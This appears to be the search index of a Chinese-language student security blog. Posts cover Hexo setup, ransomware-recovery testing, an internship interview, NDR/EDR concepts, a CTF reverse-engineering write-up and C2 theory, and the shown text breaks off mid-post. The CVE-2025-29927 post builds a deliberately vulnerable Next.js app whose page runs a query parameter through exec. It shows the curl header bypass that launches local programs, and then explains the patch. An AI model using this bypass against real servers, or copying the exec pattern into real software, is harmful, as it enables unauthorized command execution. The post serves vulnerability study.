[{"title":"利用 hexo + github 架設靜態網站","url":"/2024/12/31/hexo-pages/","content":"hexo引言hexo 是一個架設靜態網站的好東西，而我選擇他是因為看到別人的網頁好好看，所以也跟著做(? 原本因該很早以前就要開始了，但那時期中考很忙，所以我現在才開始(嘿嘿。github pages 是給你個免費的網域可以給別人看你的網站，但只能放靜態的，別問我什麼是動態的我也不懂(?\n第一步需要下載 Node.js 跟 hexo\n到 Node.js 官網下載 LTS 版本的 Node.js並完成下載最後會出現要不要安裝 nessary tool…的東東，可選可不選(我有選，但不選也沒差)\n可到終端機執行 node -v 或 node --version 查看版本這步驟是為了確認是否下載成功\n在終端機執行npm install hexo-cli -g下載 hexo\n可到終端機執行 hexo version 或 hexo -v 查看 Hexo 版本\n\ninit hexo 資料夾hexo init &lt;folder name&gt;cd &lt;folder name&gt;npm install # 下載 hexo 會用到的 packagenpm install hexo-deployer-git --save # 這是為了上傳到 github 時需要的工具code . # 我這裡是用vscode 進入編輯畫面\n\n\n打開 vscode 時，我們的目錄會長這樣：\n設定背景主題他其實本來就有預設的了，但我不喜歡(YA，所以我自己去找了好看的，我使用的是redefine，他真的好好看\n\n第一先點上面的 DOCS 連結\n再點畫面中的快速開始\n按照上面所述的方式設定主題\n在終端輸入 npm install hexo-theme-redefine@latest\n到_config.yml 裡面將theme: landscape變為theme: redefine\n再把原本的_config.landscape.yml改為_config.redefine.yml\n在進入_config.redefine.yml 並把此連結的內容複製進去\n\n這樣就搞定一些了，換到 github pages 的設定了\ngithub pages\n登入 github，(這步我就不教了\n按new把Repository name*打上用戶名.github.io，應該會到以下畫面：所以看到我的網址就可以知道我的用戶名是happymike0103\n\n\n這樣目前就設定好了\n\n_config.yml再來要回到這裡去配置上傳的路徑\n\npost_asset_folder: false改成 true\n加上這段配置\n\nmarked:  prependRoot: true  postAsset: true\n\n\n把以下設定改好(這步是將資料 commit 到 github 的重點\n\ndeploy:  type: \n\n改成\ndeploy:  type: &quot;git&quot;  repo: &quot;https://github.com/用戶名/用戶名.github.io.git&quot;  branch: &quot;main&quot;\n\n指令介紹hexo clean # 把之前的資料清乾淨hexo generate #產生新的靜態資料(就是public/)hexo server # 可以在本地預覽你的網站(http://localhost:4000/)hexo deploy # 把網站用到 github 上面# 同時，以上指令也有簡寫：hexo clhexo ghexo shexo dhexo new post &lt;postname&gt; # 新增一個post，名為&lt;postname&gt;\n\n花式教學\n  \n    \n      [Header]\n\n    \n    \n      color[blue,red,cyan,orange,yellow,green…]custom icon[fa-image]support nextLine\n\n    \n  \n\n [name]\n\n[Header] \n              \n              Contentasdfasdf\n              \n            \n\nex：\n\n  \n    \n      Test\n\n    \n    \n      contentsupport nextLine\n\n    \n  \n\n\n  \n    test note 12434\n\n  \n\n kazma\n\nFolding 測試 Testing \n              \n              啊啊啊啊啊      danger 好可怕好嚴重         tip 這只是個小提示   \n              \n            \n\nFirst TabSecond TabThird TabThis is Tab 1.This is Tab 2.\nThis is Tab 2.This is Tab 3.\nThis is Tab 3.\nThis is Tab 3.\n\ngraph TD;    A--&gt;B;    A--&gt;C;    B--&gt;D;    C--&gt;D;\n\nQ &amp; A這樣就搞定一切啦，再來是一些我在架網站遇到的問題點\n\n為什麼圖片顯示不出來?\n\nA: 還記得剛剛把post_asset_folder: false改成 true 嗎，這步就是重點了，他會在我們執行hexo new post &lt;postname&gt;時產生 &lt;postname&gt;.md 跟 &lt;postname&gt;，當我們要在 md 裡面插入圖片時就可以放到&lt;postname&gt;資料夾裡，然後把圖片的路徑設為pic_name.jpg就好，不須再加上其他有的沒的\n\n\n為什麼我明明已經 hexo deploy，但我的 github pages 卻沒反應?\n\nA: 因為你上傳到那 github 上面是需要一段時間的(我用起來要個 2-3 分鐘左右)，所以可以先滑個手機等待一下，但更好的方式是在撰寫的過程中用hexo server去做預覽會更好，這樣就不用一直等待了\n\n\n\n結論由於這是第一篇文章，所以排版可能不會那麼好看，我也會在制訂一下版面，但我大概就不會再改了，畢竟我想要做我的成長學習歷程，所以請各位加減看吧，由於現在算是寒假吧，我會努力多生產一點文章，如果沒有代表我去輪迴了，懇請多多擔待，我也趁著一天的時間把所有東西都寫好了，那就請各位慢慢欣賞吧我們明年見，新年快樂!!\n參考資料\n主題\n官方文件\nHexo 教學：從頭打造個人部落格 — 開發環境設置與專案初始化\n架設部落格第一次就上手 Hexo + Github + 自訂網域\n【學習筆記】如何使用 Hexo + GitHub Pages 架設個人網誌\nHexo插入圖片並解決圖片的路徑問題\n\n","tags":["hexo","github"]},{"title":"CDM (Data & Recover)","url":"/2025/04/19/CDM_Data_and_Recover/","content":"\n    目錄\n\n\n前言 \nWhat is CDM\nNeuShield\n實作\n簡報呈現\n\n\n\n前言這是學校的報告，但覺得很有趣所以也做成我的Blog，如有刊誤可以告知會進行更正。在做報告時，其實根本沒有接觸過，所以是看著表選了最具體的一個–資料備份，這預計會是短系列文，每次會報告一個新的類型，希望可以成功。\nWhat is CDM (Cyber Defense Matrix)簡短來說，CDM 是一張 5x5 的資安防禦檢查表，幫助你確認「哪些資產」在「哪些防禦階段」有做好保護。而在這表格中 “NIST CSF” 指的是功能，保護對象則是資安資產。\nNeuShield​NeuShield 是一家總部位於美國加州弗里蒙特（Fremont, CA）的網路安全公司，成立於 2017 年，專注於提供創新的資料保護解決方案，特別針對勒索軟體攻擊的防護與恢復。\n公司概況\n創立時間：​2017 年\n總部位置：​200 Brown Road, Suite 306, Fremont, CA 94539\n公司性質：​私有公司，獲得創投資金支持\n員工人數：​約 7 人\n主要產品：​NeuShield Data Sentinel\n\n產品特色NeuShield 的核心產品 Data Sentinel 採用專利技術，提供與傳統防毒軟體不同的資料保護方式：​\n\nMirror Shielding™：​建立資料的鏡像層，使勒索軟體無法直接修改原始檔案，即使遭受攻擊，也能迅速還原。\nOne-Click Restore：​一鍵還原功能，可快速將作業系統和檔案恢復至攻擊前的狀態，無需備份。\nData Engrams™：​類似檔案版本控制，保留多個時間點的資料副本，便於回復至先前版本。\nExfiltration Protection：​防止資料被未授權存取或外洩，特別針對 SQL 資料庫提供保護。\nCloud Drive Protection：​保護本機的雲端資料夾，如 OneDrive、Dropbox 等，即使離線也能恢復資料。\n\n市場表現與認可\n資金籌措：​截至 2019 年，共籌得約 160 萬美元的種子輪資金。\n業界認可：​被 Fast Company 評選為 2021 年「全球最具創新力公司」之一。\n產品評價：​PCMag 給予 Data Sentinel 4.0 分（滿分 5 分）的評價，肯定其在勒索軟體攻擊後的資料恢復能力。\n\n實作( 這同時也是我在報告中負責的部分 )\nMirror Shielding™這是他一開始的起始頁面( 他有一個很嚴重的問題，他的頁面不能縮放，看著很難受，我是P圖的嘿嘿 )按到 Mirror Shielding 可以看到他保護的威脅攻擊有哪些，緊接著，也可以看 “ NeuShield Explorer “，會看到他把我們的資料夾又複製到他自己下 ( 紅框 )，那就是所謂的保護層，所以我們在做更動時，其實是動在保護層上的再來開始測試是否有成功執行我先新增一個資料夾(內含多筆內容為檔名的資料) -&gt; 按下 commit 同意變更 ( 變成備份 )再對檔案進行加密(快速寫了凱薩加密k&#x3D;3)、原始檔與加密檔比較圖做這件事是為了模擬被malware進行檔案加密 ( 也可以是勒索病毒 )，可以透過collect log下載觀察檔( 會下載到桌面.zip )觀察文件後會看到 “ DebugLog.txt “，裡面有幾行關鍵點可以得知我的行為\n1. [2025-04-20T15:26:20.468 0418] [serv] Reverting folder C:\\Users\\vboxuser\\Desktop\\. Does not lock down this folder after reverting2. [2025-04-20T15:26:21.396 0170] [serv] Restoring folder C:\\Users\\vboxuser\\Desktop start on Sun, 20 Apr 2025 03:26:21 PM and finish on Sun, 20 Apr 2025 03:26:21 PM. Total 2 files restored. Skipped 0 files.可通過這1、2點得知我對桌面進行Reverting的開始與結束的時間3. [2025-04-20T17:18:46.052 1288] [serv] Successfully created system restore point# 3可通過第三點得知他在這時建立保護快照4. [2025-04-20T17:25:16.919 184C] [serv] VSS volume \\Device\\NeuShieldVolumeShadowCopy1 for C: is ready  5. [2025-04-20T17:25:16.926 184C] [serv] Dama now session finished  6. [2025-04-20T17:25:16.931 184C] [serv] Detached VSS volume \\Device\\NeuShieldVolumeShadowCopy1VSS ( Volume Shadow Copy ) 代表有建立隱藏快照Dama session 【可能】為處理還原的內部流程名稱 ( 沒找到官方文件 )這可以知道NeuShield 確實成功執行 Mirror Shielding Restoring\n\n此為我的 DebugLog.txt提供我的DebugLog檔\n此為學校報告的簡報原始檔 ( 我叫方景玄，負責實作，職位為騎士與工匠 )Canva\n\n恭喜我自己這次我做的比之前更深入，算是對自己的逼迫?(至少成功了，我要哭了)各位下課!!\n","tags":["CDM"]},{"title":"CVE-2025-29927 漏洞複現","url":"/2025/04/23/CVE-2025-29927/","content":"目錄\n    目錄\n\n\n\n結論\n漏洞簡介\n漏洞原理和利用方法\n漏洞復現步驟 4.1 下載 Node.js 4.2 建立漏洞專案 4.3 製作 middleware.js 腳本 4.4 建立 run.js 4.5 啟動 server 並執行 payload\npatch ( Workaround )\n\n\n\n結論Next.js 在 v11~v15.2.2 中對 x-middleware-subrequest header 採取信任策略，然而缺乏來源驗證，導致攻擊者可偽造該 header 來繞過授權邏輯，構成嚴重的權限繞過漏洞（CVE-2025-29927）。自 v15.2.3 起，官方改為建立唯一的 middleware session ID，並比對該 ID 來判斷是否為內部請求，有效解決此問題。\n漏洞簡介\n漏洞編號：CVE-2025-29927\n漏洞類型：授權繞過\n影響範圍：Next.js v11.1.4 ~ v15.2.2（含）\nCVSS 3.X 分數：9.1（Critical）\n\n\n\n\nExploitability Metric\nImpact Metric\n\n\n\nAV : Network\nS : Unchanged\n\n\nAC : Low\nC : High\n\n\nPR : None\nI : High\n\n\nUI : None\nA : None\n\n\n\n描述：  當 Next.js 使用 Middleware 處理授權邏輯時，攻擊者可通過特殊標頭 X-Middleware-Subrequest 繞過中介軟體的授權邏輯，進而未經授權訪問受保護的頁面。\n\n發現者: 由資安公司 Akamai 的研究人員所發現。\n\n回報時間:\n  於2025 年 3 月 14 日 首度通報給 Next.js 官方開發團隊。該團隊隨後在 2025 年 4 月 10 日釋出修補版本，並於 2025 年 4 月 16 日公告此漏洞細節與 CVE 編號。\n\n\n漏洞原理和利用方法Next.js 使用內部特殊標頭 x-middleware-subrequest 來識別內部請求，如 React Server Components（RSC）或 App Router 中的子請求。若攻擊者在外部請求中加入此標頭，Next.js 錯誤地認定其為內部請求，跳過了 middleware 的驗證邏輯。\n而會發生此漏洞的最根本原因是Next.js在處理子請求中間件機制的設計缺陷：\n\n內部子請求識別方式：當中間件需要向內部路由發送請求（如抓取資料或執行驗證）時，Next.js 會自動加入 x-middleware-subrequest 標頭，用來標示這是內部請求，以避免中間件重複執行造成無限循環。\n\n缺乏來源驗證：漏洞的關鍵在於 Next.js 並未對這個標頭的來源進行嚴格驗證。這導致外部請求如果攜帶這個標頭，也會被誤認為是內部子請求。\n\n中間件邏輯問題：只要 Next.js 偵測到請求中有 x-middleware-subrequest 標頭，就會略過對該請求的中間件處理，直接將其導向對應的路由或 API。\n\n繞過授權檢查：攻擊者只需手動添加這個特殊的標頭，即可繞過原本由中間件執行的授權驗證，直接存取應該受保護的資源。\n\n\n漏洞復現步驟系統環境：\n\nWindows 10\nNode.js v22.14.0\nNext.js v15.2.2\n\n具體步驟：\n\n下載 Node.js\n建立漏洞專案\n製作 middleware 腳本\n設定 next.config.mjs\n建立 run.js\n啟動 server\n傳送 payload 並 bypass 開啟 calc.exe\n\n下載 Node.js進入 Node.js 官網並下載Node.js(v22.14.0)完成後可至cmd驗證是否成功\nnode -vnpx -vnpm -v# 都有出現對應版本編號即可\n\n\n建立漏洞專案建立專門針對「漏洞 PoC 的最小環境」(vuln_nextjs_calc)在桌面並展示專案目錄\ncd C:\\Users\\testUser\\Desktopnpx create-next-app@15.2.2 vuln_nextjs_calc\n\n\n設定執行環境使用有漏洞的next.js@15.2.2\ncd vuln_nextjs_calcnpm install next@15.2.2 react react-dom\n\n\n看到的Critical就是指我們這個 CVE-2025-29927 了，\n\nnext@15.2.2 -&gt; 內含 CVE-2025-29927 漏洞\nreact、react-dom 為執行 js 必要 package\n\n製作 middleware.js 腳本建立 vuln_nextjs_calc&#x2F;middleware.js，此程式用於在「請求到達頁面前」先做一些檢查，例如：\n\n是否已登入？\n是否有權限訪問某頁？\n是否來自內部來源？\n\nimport &#123; NextResponse &#125; from &#x27;next/server&#x27;export function middleware(request) &#123;  const isInternal = request.headers.get(&#x27;x-middleware-subrequest&#x27;)  if (!isInternal) &#123;    return new NextResponse(&#x27;Unauthorized&#x27;, &#123; status: 401 &#125;)  &#125;  return NextResponse.next()&#125;export const config = &#123;  matcher: [&#x27;/protected/:path*&#x27;]  // 指定哪些路徑會被 middleware 攔截 (這裡是/protected/* 都會被攔截)&#125;\n\n\n簡單講解程式碼如果有抓到 x-middleware-subrequest 則通行請求；否則拒絕授權請求。最後設定要經過protect的請求要先被中介層攔截。\n為什麼是 x-middleware-subrequest？因為這個標頭是 Next.js 自己「內部」產生的，一般的用戶端並不會產生。\nNext.js 在處理以下「內部子請求」時會自動才加上這個標頭，又因為這些請求其實是來自 Next.js 自己的核心模組，所以 Next.js 預設信任這個標頭，漏洞也因此產生。\n那既然我們知道他會依有無這個Header進行判斷，那就在curl時加上這個Header即可bypass\ncurl http://localhost:3000/protected/run?cmd=calc -H &quot;X-Middleware-Subrequest: 1&quot;\n\n為什麼是&#x2F;protected？\n更貼近「實務部署中的半公開資源」\n在滲透測試中較易誘導開發者疏忽\n可用性與示範性強\n\n本次 PoC 將漏洞入口放置於 /protected/，模擬現實系統中將內部功能藏於「看似有授權但實際驗證不足」的路徑下。相較於高敏感度 /admin/，此類路徑往往因為開發者認為「不容易猜中」而疏於設防，是授權繞過的熱門目標。\n為什麼不選admin因為一看就是敏感資源，通常防禦最嚴（多層保護、非公開、二次驗證、IP 限制）\n建立 run.js新建 run.js 於 pages/protested/，模擬了真實系統中「僅供內部或管理員操作的命令執行功能」，\nimport &#123; exec &#125; from &#x27;child_process&#x27;export async function getServerSideProps(&#123; query &#125;) &#123;  const cmd = query.cmd || &#x27;calc&#x27;  exec(cmd, (err) =&gt; &#123;    if (err) console.error(&quot;執行失敗：&quot;, err.message)  &#125;)  return &#123; props: &#123; cmd &#125; &#125;&#125;export default function Run(&#123; cmd &#125;) &#123;  return (    &lt;div&gt;      ✅ 已執行指令：&lt;b&gt;&#123;cmd&#125;&lt;/b&gt;    &lt;/div&gt;  )&#125;\n\n啟動 server 並執行payload啟動 servernpm run dev\n\n\n執行payload\n先下載curl – choco install curl\n\n執行 curl 加上 header\n\n\ncurl &quot;http://localhost:3000/protected/run?cmd=calc&quot; -H &quot;X-Middleware-Subrequest: 1&quot;\n\n\n整個攻擊就完成啦!!!\n\n也可以更換payloadcurl “http://localhost:3000/protected/run?cmd=notepad“ -H “X-Middleware-Subrequest: 1”curl “http://localhost:3000/protected/run?cmd=mspaint“ -H “X-Middleware-Subrequest: 1”\n\npatch ( Workaround )問題本質 RecapJS 錯誤地信任 header，導致攻擊者只要加上這個 header，就能繞過 middleware 的驗證\n官方修復根據 Next.js GitHub 官方提交紀錄：Update middleware request header (#77201)\n官方在 commit 中將對 x-middleware-subrequest 的信任邏輯，改為使用 isInternalRequest() 進行判斷，從而防止外部請求偽造 header 繞過中介層驗證（CVE-2025-29927）。\n統整更動\n\n\n分析項目\n原本的做法\n導致的問題\n修補後的做法\n\n\n\n是否為內部請求\n只要請求帶有標頭 x-middleware-subrequest 就視為「內部請求」\n攻擊者可以用 curl 加上這個標頭就騙過 middleware，繞過授權\n驗證該請求是否帶有 正確 session 的唯一 ID，才信任它是內部請求\n\n\n判斷邏輯位置\n沒有驗證來源，只靠單一 header 判斷\n外部使用者可偽造 header，跳過中間件邏輯、執行敏感操作\n在核心程式碼中加入 session 追蹤與 header 過濾，清除不合法的 header\n\n\n繞過途徑\ncurl &quot;http://host&quot; **-H &quot;X-Middleware-Subrequest: 1&quot;**\n沒有比對內部 request session 的 ID，任何人都可以成功繞過驗證！\n必須同時帶有 Next.js 內部塞入的 x-middleware-subrequest-id 並且與 global session 一致，否則直接刪除 header\n\n\n資料來源\ngithub js 官網\nNVD 漏洞訊息\nCensys 漏洞訊息\nVercel 漏洞追蹤\nJFrog 漏洞原理\n\n","tags":["CVE"]},{"title":"Leukocyte-Lab","url":"/2025/06/10/Leukocyte-Lab/","content":"面試情況由於Leukocyte-Lab的創辦人是學校的老師，並且關係與成績(?都還不錯，於是老師有說可以投它們公司會幫忙說一下。\n本身條件\n大二升大三\n應徵職位是資安研究員\n時間為暑期實習 + (暫定大三繼續做)\n\n面試情況原本是要過兩關，第一關為人資主管面試，第二為技術主管，但當天人資主管確診所以直接面試技術主管\n人資面試內容(之後面完會再更新)\n技術主管內容一開始 singo (主管)就有說明因為要面試的是實習且我才大二，所以他更多會偏向在問經歷過什麼，不會問太多太技術面的內容，但如果是要面試正職的話可能要考慮一下這點。在面試的過程中會發現 singo 是為超好聊天的主管，他先介紹了公司部門在做什麼的，與每個職位要做的是，公司的系統長什麼樣等等。都有很詳細的說明。當然也有進行詢問一些問題有把這些做成 QA 供大家參考。\nQA 1:你有參加什麼戰隊與你打的領域是什麼呢？A: 我目前是 BEEF 50UP 的戰隊成員，常打的位置是 PWN 跟 REV \nQA 2:有什麼(CTF)題目是讓你印象最深刻的A: 是CGGCCTF中的其中一題，是有多次組合題，所以解完一個要再解一層，那時解開兩層後一直卡在第三層，幸好隊友有想法，才解開來\nQA 3: 那你會會什麼工具做動態或靜態分析A:以靜態來說我會使用 ida 為主， ghidra 為輔；以動態而言我會用gef、pwndbg為主\nQ: 那你有用過windbg嗎A: 我…之後會用(嘿嘿\nQA 4:你知道我們公司在做什麼嗎A: 做BAS的\nQ: 那你簡單介紹 BAS 一下吧A: 就是透過已知的攻擊手法去全面的測試系統有無漏洞會有影響\nQA 5:你對公司還有什麼問題嗎A: 有什麼樣的資源會建議使用呢(像是課程、培訓、合作公司)\nQ: (有點內部的回答我就先不寫了，絕對不是我忘了)\n公司情況作業環境腳本使用yaml檔進行撰寫，公司有開發轉寫環境(防呆)，介面算是很好看的了\n技術部門有兩種\n劇本開發\nCVE 復現\n\n劇本開發\n邊境防護\n電子郵件防護\n端點防護\n橫向攻擊\n上網防護演練\n資料望謝防護\n\n目標要做到客戶可以一鍵測試並且是以點數進行購買\n個人心得由於這是老師的公司，本身就有多查一點資訊，他們名聲沒有其他響亮是因為接觸層級不夠，跟它們合作的公司其實都是資安界裡面的前段公司，這意味著本身的實力要夠硬，真的與內部的主管談論過，才更加的了解原因，也看到有過多次獲獎經驗，希望第一次的實習可以有好起始點。\n","tags":["面試","Leukocyte-Lab"]},{"title":"CDM_NDR","url":"/2025/04/21/CDM-NDR/","content":"\n    目錄\n\n\n前言\nWhat is NDR\nEDR?NDR?XDR?MDR?\n實作\n相關連結\n\n\n\n前言由於撰寫這篇其實是很久以前了，所以我在介紹時會比當初報告多許多知識。當初在報告時並沒有介紹到 EDR、XDR 等，所以並不是都在報告內有所呈現。\nWhat is NDR(NDR, Network Detection And Response)負責在網路層中進行威脅偵測、分析與回應，目的在於即時找出潛藏在內部或外部的異常活動或攻擊行為。通常 NDR 會關係到以下內容：\n\n網路封包分析（Packet Inspection）\n\n深入檢查進出內網的封包，不只看 header，也會看 payload。\n\n\n行為分析（Behavioral Analytics）\n\n用 AI&#x2F;ML 分析設備、用戶或伺服器的平常行為，一旦出現異常（如 lateral movement、data exfiltration）就觸發警報。\n\n\n威脅偵測（Threat Detection）\n\n可以偵測未知攻擊（zero-day）、APT、內部威脅（insider threat）等，與傳統 signature-based IDS 不同，更偏向行為與模式學習。\n\n\n回應機制（Response）\n\n支援即時或自動阻斷攻擊（如阻斷連線、封鎖 IP）、發送 SIEM log、啟用隔離機制等。\n\n\n\nDR 全家桶\n\n\n名稱\n全名\n核心監控範圍\n功能重點\n適合對象\n\n\n\nEDR\nEndpoint Detection and Response\n終端裝置（電腦、手機、伺服器）\n監控與回應惡意行為、勒索、內網擴散\n有大量主機資產的大型企業\n\n\nNDR\nNetwork Detection and Response\n網路層（封包、流量、行為模式）\n偵測 lateral movement、未知攻擊、封包異常\n資料中心、大型企業、混合雲環境\n\n\nXDR\nExtended Detection and Response\n多層整合（EDR + NDR + Email + Cloud）\n一體化威脅偵測、分析與回應平台\n想統一管理資安的組織\n\n\nMDR\nManaged Detection and Response\n外包式的 DR（託管資安服務）\n有專人幫你操作、分析、通報甚至回應\n沒有資安團隊的中小企業\n\n\n逐步介紹EDR：Endpoint Detection and Response\n重點：監控單一終端設備行為（像電腦、手機、伺服器）\n功能：紀錄檔案活動、程序行為、記憶體異常、勒索加密行為\n偵測像：勒索軟體、惡意程式、PowerShell 攻擊\n常見產品：CrowdStrike Falcon、Microsoft Defender for Endpoint、SentinelOne\n\nNDR：Network Detection and Response\n重點：監控整個網路流量與裝置間的互動\n功能：封包分析、行為建模、C2通訊偵測、內網橫向移動\n偵測像：未知惡意流量、滲透攻擊、資料外洩\n常見產品：Darktrace、Vectra AI、ExtraHop\n\nXDR：Extended Detection and Response\n重點：跨平台整合（EDR + NDR + Email + Cloud + Identity）\n功能：集中分析、威脅狩獵、SOAR 整合、跨域自動化\n偵測像：複合式攻擊鏈、攻擊者在不同領域間移動\n常見產品：Palo Alto Cortex XDR、Microsoft Sentinel + Defender、Trend Micro Vision One\n\nMDR：Managed Detection and Response\n重點：專業團隊「幫你」使用 EDR&#x2F;NDR&#x2F;XDR 系統\n功能：24&#x2F;7 監控、報告產出、事件通報、協助阻斷\n偵測像：任何異常事件，有團隊幫你處理\n常見廠商：Rapid7 MDR、CrowdStrike Falcon Complete、IBM Security Services\n\n","tags":["CDM"]},{"title":"TSCCTF write up (賽後解)","url":"/2025/01/22/2025-1-22-TSCCTF/","content":"REV\n    目錄\n\n\nReverse\nWhat_Happened\nChill Checker\nGateway to the Reverse\nMeoware\n\n\n\n\n\nWhat_Happened雖然題目說不用用靜態分析直接用動態，但我還是稍微用了ida一下，以下是靜態完的結果\n\n\n這裡是我覺得的重點，所以我接下來就直接去看了enc跟dec兩個函式\nChill_Checker先打開ida 做逆向分析，可知他會先輸入長度為8的Input ，再經過7次complex_function 加密，要等於”SGZIYIHW”(要顛倒，原因是此執行檔是little-endian 所以儲存順序會顛倒\n\n以下可以有兩種方式逆向\n靜態逆向\n透過觀察main 可知輸入的Input 每個字元都會逐一經過complex_function加密，所以可以得到以下示意圖：\nInput -&gt; complex_function -&gt; ”SGZIYIHW”\n\n再觀察complex_function 可得到以下重點\n\n綠色：Input 要在’A’(65) ~ ’Z’(89)之間藍色：為加密演算法，所以可得以下公式\n((a1 - 65 + 31 * a2) % 26 + 65) &#x3D; [SGZIYIHW]做逆向求 a1：(a1 - 65 + 31 * a2) % 26 &#x3D; [SGZIYIHW] - 65a1 - 65 + 31 * a2 &#x3D; [SGZIYIHW] - 65 + 26ka1 &#x3D; [SGZIYIHW] - 65 + 26k + 65 - 31 * a2a1 &#x3D; [SGZIYIHW] + 26*k - 31 * a2\n\n以他做一個exploit.py\nOutput = &quot;SGZIYIHW&quot;Input = &quot;&quot;def dec_func(a1 , a2):    return chr((ord(a1)-65-a2*31)%26+65)for i in range(8):    Input += dec_func(Output[i] , (i+8))print(Input)\n\n即可得到真正要輸入的字串：\nTSCCTF\\REV&gt; python exploit.py&quot;ENBFQVPZ\n\n再重新啟動elf檔並輸入”ENBFQVPZ”即可得到flag\n┌──(kali㉿kali)-[~/Downloads]└─$ ./chillWhisper your code: ENBFQVPZMan, you&#x27;re really on fire!Your flag is: TSC&#123;t4k3_1t_3a$y&#125;\n\n動態逆向用ida 觀察main可知他會將原始字串加密後由strcmp去進行比較，所以只要隨便輸入東西在比較時把暫存器內的值進行更動即可\ngef➤  disas main\n\n\n紅色範圍：complex_function 加密，結束後到藍色strcmp做比較藍色範圍：比較函式。對他做斷點，以便後續竄改加密結果gef➤  b *0x000055555555544f# 在0x000055555555544f &lt;+187&gt;:   call   0x555555555070 &lt;strcmp@plt&gt;這行做斷點\n\n並開始程式，輸入範圍在A~Z之間且為長度為8個字元即可\ngef➤ rWhisper your code: gef➤ ABCDABCD\n\n此時會看到strcmp@plt的參數會傳入的值，並對其進行修改\n\n我們要改的值是$rdi的值 ( by calling convention, 呼叫慣例，修改完後繼續執行程式即可通過檢查並成功取得flag\ngef➤ set &#123;char[9]&#125; 0x00007fffffffdc90 = &quot;SGZIYIHW&quot;gef➤ cYour flag is: TSC&#123;t4k3_1t_3a$y&#125;\n\nGateway_to_the_Reverse方法一 ( gdb-gef先用ida打開並觀察發現(看不懂，s2 是單獨計算的，與輸入是多少無關，所以只要在strcmp 時，設個斷點，觀察s2即可看到輸入要等於什麼\ngef➤ b strcmp@pltgef➤ rEnter the access key: gef➤ ABCDABCD\n\n\n即可得知flag了\n方法二 ( ltrace\n因為它會把函式之間的關係都顯示得很清楚，自然也能看到傳入的參數為何\nMeoware經過觀察後重點在於它會有一段，所以只要rand() &#x3D;&#x3D; 0 即可結束迴圈\n\n\nv3 = time(0LL);srand(v3);while ( rand() )&#123;  show pic&#125;\n\n再來結束迴圈後出現了std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;_bss_start, &quot;flag is:&quot;); ，所以很明顯我們要先結束迴圈並繼續執行到最後\n所以到gef裡面進行動態分析：\ngef➤  startigef➤  i func...main...gef➤ b maingef➤ cgef➤ disas [main]\n\n\n\n由此可知他迴圈是先跳到&lt;main+593&gt; 接著進行比較，test   eax,eax ，如果不為 0，則回到迴圈裡，所以在此設斷點，再把eax設為0即可跳出迴圈並執行程式。\ngef➤ b *main+598gef➤ c # 這時看到 eax 並不等於 0gef➤ set $eax = 0 # 即可使迴圈不符合條件gef➤ cflag is:TSC&#123;Bobo_milk-tea_black-carbon&#125;","tags":["CTF","REV","writeup"]},{"title":"C2 理論篇","url":"/2025/07/04/C2-%E7%90%86%E8%AB%96%E7%AF%87/","content":"目錄\n前言：為什麼要研究 C2\n定義：C2 是什麼\nC2 通訊模型\nC2 通訊行為\n\n\n各種架構的優缺比較表\n小結論\n參考資料\n\n前言撰寫本篇的契機，源於對資安研究的興趣，尤其是未來實習工作中有可能接觸 C2 技術與紅隊攻擊鏈，特此整理與紀錄所學，作為學習筆記與知識累積的一部分。\n會本篇將會依據 Mitre ATT&amp;CK TA0011 Command and Control  進行技術定義與實務研究，內容涵蓋其常見技術、架構類型與攻防觀點。\n且本篇所有實作或是流程圖將會於實戰篇內進行撰寫，在此只會簡介原理與優缺點。\n定義根據 MITRE ATT&amp;CK TA0011 定義可知，Command and Control ( 又名 C2 C&amp;C attack )，是在已被控制的系統或裝置進行溝通的一系列技術，攻擊者會透過它們下達指令 ( C2 Server )、回傳資料 ( 資料外洩 )，或下載惡意軟體以執行惡意行為，同時為了因應各種不同的網路架構與防禦強度，攻擊者可選擇不同的C2技術以達到隱蔽性或是快速等等多種目的達成目標。\nC2 通訊模型分為三大類\n\nClient - Server\n\n攻擊者控制一台中央伺服器 ( C2 Server ) ，受害端們（Client）會連線至該伺服器取得指令、回傳結果。\n\n\nPeer to Peer ( P2P )\n\n每個感染主機既是 Client 也是 中繼 Server\n無需中央 C2 Server，彼此分享 C2 指令（通常有加密和簽章驗證）\n通常有 egrass 作為輸出結果回傳的出口\n拓樸類似區塊鏈或 BitTorrent\n\n\nMulti-Stage\n\n分為多個階段執行：\n第一階段（Stage 1）：使用簡單協定與偽裝，例如 HTTPS beacon\n第二階段（Stage 2）：載入更強的 C2 模組（如 SOCKS proxy、P2P、Domain Fronting）\n\n\n可整合 fallback 通道與模組熱切換\n\n\n\nC2 通訊行為\n以下將會介紹常見或是較為重要的通訊行為種類\n\nClient - Server\nBeacon\n\n原理\n被感染的裝置 ( Victim, Client ) 定時向 C2 Server 發送 check-in ( 詢問 ) 封包\n通常是 HTTP POST、DNS Query\n詢問是否有任務\n\n\n有則將結果於下次時間回傳\n封包內通常包含\ntimestamp\nhost info\nexecute result ( 加密 )\n\n\n\n\n無則繼續等待下次詢問\n\n\n最常見的 C2 模式，因其容易實作\n行為可用模型預測，可加上 Jitter ( 隨機時間 ) 進行規避\n但有研究指出就算加上了，還是可以被預測出( The Jitter-Trap: How Randomness Betrays the Evasive )\n\n\n常用工具為 Cobalt Strike Beacon\n\n\nReverse Shell\n\n原理\nC2 Server 開啟 Listener\nClient 對 C2 Server 開的 ip:port 進行 Outbound TCP 連線 ( 通常 )\n即開啟互動式 Shell 通道，類 ssh\n其封包傳輸為雙向、持續性 ( 與 Beacon 不同 )\n\n\n用於初期快速控制具有即時性，但容易被發現\n常用工具\nMetasploit Reverse TCP/HTTPS\nCobalt Strike Reverse Shell Listener\nSliver Reverse Session\n\n\n\n\nWebSocket &#x2F; HTTP2\n\n可看成改良版的 Reverse Shell，但使用現代協議 ( WebSocket 或 HTTP&#x2F;2 ) 建立持久化的雙向連線\nHTTP Upgrade 建立 WebSocket 連線後可持續雙向通訊\n使用 moultiplexing and header pack (HPACK) 更難被傳統的 WAF 檢測到\n使用 port 號於 443 port ( 與正常的HTTPS混用，加大檢測難度 )\n常用工具\nMythic (WebSocket C2)\nSliver HTTP/2 Mode\nMerlin C2\n\n\n\n\n\nPeer to Peer\nFull Mesh\n每個node 都與其他node相連\n去中心化\n具高容錯性與路由彈性\n實際應用於小規模的 C2 中，因節點指數增加幅度呈 n(n-1)&#x2F;2 成長\n\n\n\nSupernode + Leaf\n節點分為：\nSupernode：具備較強資源（CPU、頻寬），負責管理多個下層葉節點\nLeaf Node：只連到 Supernode，不彼此通信\n\n\n資源索引、搜尋、轉發皆由 Supernode 控制\n\n\n\nHybrid P2P + Cenralized\nP2P 